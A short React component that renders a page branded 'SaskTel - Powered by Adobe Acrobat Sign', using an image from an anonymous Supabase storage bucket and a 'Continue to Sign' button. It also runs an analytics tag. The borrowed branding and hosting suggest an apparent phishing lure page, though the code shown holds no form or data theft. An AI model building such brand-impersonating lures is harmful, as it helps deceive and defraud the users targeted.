import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    try {
      
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');



        lucide.createIcons();
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
  }, []);

  return (
    <>
      
<main className="w-full max-w-md px-6 flex flex-col items-center justify-center space-y-10">

<div className="w-full flex justify-center">
<img alt="SaskTel - Powered by Adobe Acrobat Sign" className="w-full max-w-[320px] h-auto object-contain" src="https://hoirqrkdgbmvpwutwuwj.supabase.co/storage/v1/object/public/assets/assets/917d6f93-fb36-439a-8c48-884b67b35381_1600w.jpg"/>
</div>

<button className="group w-full sm:w-auto flex items-center justify-center gap-2.5 bg-zinc-900 hover:bg-zinc-800 text-white transition-all duration-200 rounded-md px-8 py-3.5 text-lg font-medium shadow-sm active:scale-[0.98]">
            Continue to Sign
            <i className="w-5 h-5 opacity-80 group-hover:translate-x-0.5 transition-transform duration-200" data-lucide="arrow-right" strokeWidth="1.5"></i>
</button>
</main>


    </>
  );
}
